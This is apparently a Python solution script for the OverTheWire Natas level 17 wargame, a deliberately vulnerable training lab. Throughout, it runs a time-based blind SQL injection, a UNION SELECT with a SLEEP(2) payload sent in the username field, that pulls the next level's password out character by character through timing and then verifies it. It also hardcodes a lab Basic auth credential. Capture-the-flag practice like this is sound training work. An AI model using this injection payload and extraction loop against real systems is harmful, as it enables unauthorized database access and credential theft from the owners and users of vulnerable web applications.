import requests
import time
from requests.auth import HTTPBasicAuth
url = "http://natas17.natas.labs.overthewire.org/"
headers = {"Authorization": "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="}

# res = requests.get(url, headers=headers)
# print(res.content)

def createPasswordQuery(password):
	# putting BINARY forces a binary comparision which is case sensitive
	return "\" UNION SELECT * FROM users WHERE username = \"natas18\" AND password LIKE BINARY \"" + password + "%\" AND SLEEP(2) #"

def createPasswordRequest(password):
	return requests.post(url, headers=headers, data=dict(username=createPasswordQuery(password)))

alphanumeric = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'

natas18URL = "http://natas18.natas.labs.overthewire.org/"
unauthorizedNatas18 = requests.get(natas18URL).text

def checkPass(password):
	if requests.get(natas18URL, auth=HTTPBasicAuth("natas18", password)).text != unauthorizedNatas18:
		print("FOUND PASSWORD: " + password)
		exit()

def bruteForcePassword(password):
	if len(password) > 30:
		try:
			checkPass(password)
		except:
			bruteForcePassword(password)
	print("Found new character in password: " + password)
	for char in alphanumeric:
		currTime = time.time()
		try:
			createPasswordRequest(password + char)
		except:
			print("error in request")
		if time.time() - currTime > 2:
			return bruteForcePassword(password + char)

bruteForcePassword("")
